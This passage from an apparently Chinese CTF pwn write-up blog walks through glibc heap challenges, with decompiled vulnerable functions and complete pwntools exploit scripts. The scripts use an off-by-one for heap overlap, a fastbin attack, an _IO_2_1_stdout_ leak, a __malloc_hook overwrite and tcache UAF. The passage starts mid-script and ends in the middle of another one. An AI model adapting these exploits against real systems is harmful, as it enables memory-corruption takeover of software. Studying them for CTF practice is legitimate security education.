class="number">0x60</span> + <span class="string">&#x27;\x00&#x27;</span> * <span class="number">0x8</span> + p64(<span class="number">0x71</span>) + p64(<span class="number">0x60208d</span>)</span><br><span class="line">edit(<span class="number">0</span>, <span class="number">200</span>, payload) <span class="comment"># 修改第一个堆的data,造成堆溢出,因为堆1和堆2在物理地址上相邻,对第一个堆写入的话,可以覆盖到第二个堆,先用0填充堆1的data,然后再用0填充了堆2的pre_size, 堆2的size填充71(这里为了和后面找的7f在同一个fastbin指针,构成链表), 然后是fd指针,这里造成了fastbin attack, 我们伪造了一个新的chunk接在堆2后面(这个堆在我们目标需要修改的heaparray上方不远处)</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>, <span class="string">&#x27;aaa&#x27;</span>) <span class="comment"># 重新从fastbin里面取出堆2</span></span><br><span class="line">add(<span class="number">0x60</span>, <span class="string">&#x27;aaa&#x27;</span>) <span class="comment"># 取出我们伪造的堆3</span></span><br><span class="line"></span><br><span class="line">malloc_got = elf.got[<span class="string">&quot;malloc&quot;</span>]</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">3</span> + p64(<span class="number">0</span>)*<span class="number">4</span> + p64(malloc_got) </span><br><span class="line">edit(<span class="number">2</span>, <span class="number">0x100</span>, payload) <span class="comment"># 这里修改堆3, 因为我们伪造的堆,和heaparray重叠了,这里直接修改了heaparray的第一个指针,即堆1的地址,让它指向malloc_got,这样实现任意地址改</span></span><br><span class="line"></span><br><span class="line">payload = p64(backdoor)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">edit(<span class="number">0</span>, <span class="number">0x10</span>, payload) <span class="comment"># 把我们刚刚修改的堆1的地址,即malloc_got,改为后门函数</span></span><br><span class="line"></span><br><span class="line">menu(<span class="number">1</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&quot;Size of Heap : &quot;</span>, <span class="string">&#x27;10&#x27;</span>) <span class="comment"># 用add触发一次malloc,跳转到后门函数</span></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="查看gcc版本-libc版本"><a href="#查看gcc版本-libc版本" class="headerlink" title="查看gcc版本,libc版本"></a>查看gcc版本,libc版本</h4><p><code>strings pwn | grep GCC</code></p>
<p><code>strings libc.so.6 | grep libc</code></p>
<h3 id="king-in-heap-1"><a href="#king-in-heap-1" class="headerlink" title="king_in_heap_1"></a>king_in_heap_1</h3><blockquote>
<p>Of By One:修改pre_used标志 , 打堆重叠,向上合并</p>
<p>堆重叠:可以造成fastbin attack</p>
<p>fastbin attack:可以打malloc_hook</p>
<p>要打malloc_hook,需要知道libc基地址,打IO流</p>
<p>IO流也需要libc基地址,我们有printf的后六位地址,可以尝试偏移改地址</p>
<p>unsortbin 可以提供libc基地址前几位</p>
<p>我们需要把libc的地址放到fastbin的fd的位置,通过偏移更改fd指针,实现fastbin attack</p>
<p>第二次fastbinattack直接用UAF修改fd指针</p>
</blockquote>
<ul>
<li>checksec</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br><span class="line">RUNPATH:  &#x27;/glibc/x64/2.23/lib/&#x27;</span><br></pre></td></tr></table></figure>

<p>堆题经典的保护全开</p>
<ul>
<li><p>main</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall __noreturn <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> choice; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  init_();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      menu(a1, a2);</span><br><span class="line">      choice = read_num();</span><br><span class="line">      <span class="keyword">if</span> ( choice != <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">delete</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( choice &gt; <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( choice == <span class="number">3</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        edit();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( choice == <span class="number">666</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        leak();</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( choice == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      add();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li><p>leak()</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">leak</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>, (&amp;<span class="built_in">printf</span> &amp; <span class="number">0xFFFFFF</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>泄露了printf地址的后六位十六进制位</p>
</li>
<li><p>edit里面的修改函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 __fastcall <span class="title">sub_CD3</span><span class="params">(__int64 a1, <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+13h] [rbp-Dh] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !read(<span class="number">0</span>, &amp;buf, <span class="number">1uLL</span>) )</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> ( buf == <span class="string">&#x27;\n&#x27;</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    *(a1 + v4++) = buf; <span class="comment">//这里有一个Of By One</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v4 &lt;= a2 );</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>有一个Of By One</p>
</li>
<li><p>exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span> </span><br><span class="line">file_path = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line">context(binary=file_path, os=<span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;i386&#x27;</span>)</span><br><span class="line"><span class="comment">#context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;, &#x27;-F&#x27; &#x27;#&#123;pane_pid&#125;&#x27;, &#x27;-P&#x27;]</span></span><br><span class="line"><span class="comment">#context.terminal = [&#x27;gnome-terminal&#x27;, &#x27;-x&#x27;, &#x27;sh&#x27;, &#x27;-c&#x27;]</span></span><br><span class="line">elf = ELF(file_path)</span><br><span class="line"></span><br><span class="line">_debug_ = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> _debug_:</span><br><span class="line">    io = process(file_path)</span><br><span class="line">    <span class="comment">#libc =ELF(&quot;/lib/i386-linux-gnu/libc-2.27.so&quot;)</span></span><br><span class="line">    <span class="comment">#libc = ELF(&quot;/home/clr/Desktop/buulibc/libc-2.23-x64.so&quot;)</span></span><br><span class="line">    <span class="comment">#libc = ELF(&quot;/lib/x86_64-linux-gnu/libc-2.27.so&quot;)</span></span><br><span class="line">    libc = ELF(<span class="string">&quot;/glibc/x64/2.23/lib/libc-2.23.so&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">27422</span>)</span><br><span class="line">    <span class="comment">#libc = ELF(&quot;/home/youyue271/Desktop/buulibc/libc-2.27-x64.so&quot;)</span></span><br><span class="line">    <span class="comment">#libc = ELF(&quot;/home/youyue271/Desktop/buulibc/libc-2.27-x86.so&quot;)</span></span><br><span class="line">    <span class="comment">#libc = ELF(&quot;/home/youyue271/Desktop/buulibc/libc-2.23-x64.so&quot;)</span></span><br><span class="line">    <span class="comment">#libc = ELF(&quot;/home/youyue271/Desktop/buulibc/libc-2.23-x86.so&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">menu</span>(<span class="params">num</span>):</span></span><br><span class="line">    <span class="keyword">if</span> num == <span class="number">1</span>:</span><br><span class="line">        io.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> num == <span class="number">2</span>:</span><br><span class="line">        io.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="string">&#x27;2&#x27;</span>)    </span><br><span class="line">    <span class="keyword">if</span> num == <span class="number">3</span>:</span><br><span class="line">        io.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> num == <span class="number">4</span>:</span><br><span class="line">        io.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="string">&#x27;666&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">index, size</span>):</span></span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;index:&quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;size:&quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">index</span>):</span></span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;index:&quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index, content</span>):</span></span><br><span class="line">    menu(<span class="number">3</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;index:&quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    io.sendafter(<span class="string">&quot;context:&quot;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span>():</span></span><br><span class="line">    menu(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">leak()</span><br><span class="line">io.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">base = <span class="built_in">int</span>(io.recv(<span class="number">6</span>),<span class="number">16</span>)-libc.sym[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&quot;base =&gt; &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(base)))</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x88</span>) <span class="comment"># size = 90 =&gt; unsortedbin</span></span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x68</span>) <span class="comment"># size = 70 =&gt; fastbin , 0x70方便找0x7f fastbin attack</span></span><br><span class="line">add(<span class="number">2</span>, <span class="number">0xf0</span>) <span class="comment"># size = 0xa0 =&gt; unsortedbin , 为了堆合并构造堆重叠的 </span></span><br><span class="line">add(<span class="number">3</span>, <span class="number">0x40</span>) <span class="comment"># 防止和topchunk合并</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 这里开始堆合并,造成对重叠</span></span><br><span class="line">delete(<span class="number">0</span>) <span class="comment"># 第一个块 unused, 修改的是1的pre_used位置,变成零, 感觉合并的时候会检查第一个块是否是used,通过size得到1的pre_used标志位</span></span><br><span class="line">edit(<span class="number">1</span>, <span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x60</span> + p64(<span class="number">0x100</span>) + <span class="string">&#x27;\x00&#x27;</span>) <span class="comment"># 这里修改2的pre_size,改成0, 这样的话free(2)的时候,前一个是没有使用,就可以和前pre_size合并了</span></span><br><span class="line">delete(<span class="number">2</span>) <span class="comment"># free(2) 这里必须得向上合并</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>) <span class="comment"># 放入fastbin, 备用</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x88</span>)  <span class="comment"># 把0取回来, 把含有libc基地址的地址放到fastbin的fd里面,因为add(0, 0x88)正好把unsortedbin截断在1的地方,1此时相当于同时在fastbin和unsortedbin里面了</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>) <span class="comment"># 再次合并,这个是正常合并</span></span><br><span class="line">add(<span class="number">0</span>, <span class="number">0xb8</span>) <span class="comment"># 取一个稍微大一点的空间,覆盖到1,方便修改fastbin</span></span><br><span class="line">edit(<span class="number">0</span>, <span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x88</span> + p64(<span class="number">0x71</span>) + p64(base+libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]-<span class="number">0x43</span>)[:<span class="number">3</span>] + <span class="string">&#x27;\n&#x27;</span>) <span class="comment"># fastbin的fd指向stdout前面的7f处,造一个fastbinatack</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">5</span>, <span class="number">0x68</span>)  <span class="comment"># 取一次,把一开始放在fastbin里的1取出来</span></span><br><span class="line">add(<span class="number">6</span>, <span class="number">0x68</span>)  <span class="comment"># 取第二次,把1的fd即伪造的地址,取出来,6就是_IO_2_1_stdout_上面的地址(_IO_2_1_stderr_里面)</span></span><br><span class="line">edit(<span class="number">6</span>, <span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x33</span>+p64(<span class="number">0xfbad1887</span>) + p64(<span class="number">0</span>) * <span class="number">3</span> + <span class="string">&#x27;\x80&#x27;</span> + <span class="string">&#x27;\n&#x27;</span>) <span class="comment"># 修改stdout的内容, 修改完了以后就会输出</span></span><br><span class="line"></span><br><span class="line">libc_base = u64(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:]+<span class="string">&#x27;\x00\x00&#x27;</span>) <span class="comment"># 接收到一个基地址</span></span><br><span class="line">log.success(<span class="string">&quot;libc_base =&gt; &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(libc_base)))</span><br><span class="line">libc_base = libc_base-libc.sym[<span class="string">&#x27;_IO_2_1_stdin_&#x27;</span>] <span class="comment"># 这个基地址就是_IO_2_1_stdin_的地址,三个函数之间是相互指的,链式结构</span></span><br><span class="line">log.success(<span class="string">&quot;libc_base =&gt; &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(libc_base))) <span class="comment"># 得到libc的基地址</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">5</span>) <span class="comment"># 把fastbin的1再丢进fastbin里面</span></span><br><span class="line">edit(<span class="number">5</span>, p64(libc_base + libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]-<span class="number">0x23</span>)+<span class="string">&#x27;\n&#x27;</span>) <span class="comment"># 这个是直接UAF了,修改了fd指针,跳到mallochook上面</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">7</span>, <span class="number">0x68</span>) <span class="comment"># 把刚刚塞进fastbin里面的5取出来</span></span><br><span class="line">add(<span class="number">8</span>, <span class="number">0x68</span>) <span class="comment"># 取出__malloc_hook</span></span><br><span class="line">edit(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x13</span> + p64(libc_base + <span class="number">0x3f43a</span>) + <span class="string">&#x27;\n&#x27;</span>) <span class="comment"># 修改__malloc_hook为onegadget, 可以多尝试几个onegadget</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>) </span><br><span class="line">delete(<span class="number">0</span>) <span class="comment"># double free 报错调用 __malloc_hook</span></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="打IO泄露libc"><a href="#打IO泄露libc" class="headerlink" title="打IO泄露libc"></a>打IO泄露libc</h4><p>_IO_2_1_stdout_(注意不是stdout,那个bss上的指针), 修改开头为<code>0xfbad1887</code>填充3个0,<code>p64(0)*3</code>,然后的两个指针,stdout会输出这两个指针指向的地址之间的所有东西(前一个指针是头,后一个指针是尾),因为不知道基地址,一般就改前一个地址的最后一个字节(改的比后一个指针小,然后范围里面覆盖到一个libc基地址(这个是stdin的地址)),stdout输出以后,又会变回原来的样子</p>
<h4 id="fastbin-UAF"><a href="#fastbin-UAF" class="headerlink" title="fastbin + UAF"></a>fastbin + UAF</h4><p>可以直接修改fd指针,跳转到任意位置</p>
<h4 id="double-free-报错调用-malloc-hook"><a href="#double-free-报错调用-malloc-hook" class="headerlink" title="double free 报错调用__malloc_hook"></a>double free 报错调用__malloc_hook</h4><h3 id="king-in-heap-2"><a href="#king-in-heap-2" class="headerlink" title="king_in_heap_2"></a>king_in_heap_2</h3><blockquote>
<p>tcachebin attack和UAF</p>
<p>禁用了execve,堆的orw -&gt; 泄露堆地址,泄露libc地址</p>
<p>UAF,打tcachebin attack,可以tcachebin double free</p>
</blockquote>
<ul>
<li><p>checksec</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure></li>
<li><p>seccomp-tools 这题禁用了execve</p>
</li>
<li><p>main</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall __noreturn <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> choice; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v4; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  init_(a1, a2, a3);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      menu();</span><br><span class="line">      choice = <span class="number">0</span>;</span><br><span class="line">      __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;choice);</span><br><span class="line">      <span class="keyword">if</span> ( choice != <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">delete</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( choice &gt; <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( choice == <span class="number">3</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        edit();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( choice == <span class="number">4</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        show();</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( choice == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      add();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>增删改查都有 </p>
</li>
<li><p>add</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> *<span class="title">add</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> *result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> index; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">int</span> size; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;input index:&quot;</span>);</span><br><span class="line">  index = get_num();</span><br><span class="line">  <span class="keyword">if</span> ( index &lt; <span class="number">0</span> || index &gt; <span class="number">15</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;input size:&quot;</span>);</span><br><span class="line">  size = get_num();</span><br><span class="line">  <span class="keyword">if</span> ( size &lt;= <span class="number">15</span> || size &gt; <span class="number">96</span> ) <span class="comment">//这里有限制,生成的大小,不能超过0x60</span></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  heap_ptr[index] = <span class="built_in">malloc</span>(size);</span><br><span class="line">  result = heap_size;</span><br><span class="line">  heap_size[index] = size;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li><p>delete</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">delete</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> index; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;input index:&quot;</span>);</span><br><span class="line">  index = get_num();</span><br><span class="line">  <span class="keyword">if</span> ( index &lt; <span class="number">0</span> || index &gt; <span class="number">15</span> || !*(&amp;heap_ptr + index) )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="built_in">free</span>(*(&amp;heap_ptr + index));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>UAF</p>
</li>
<li><p>exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span 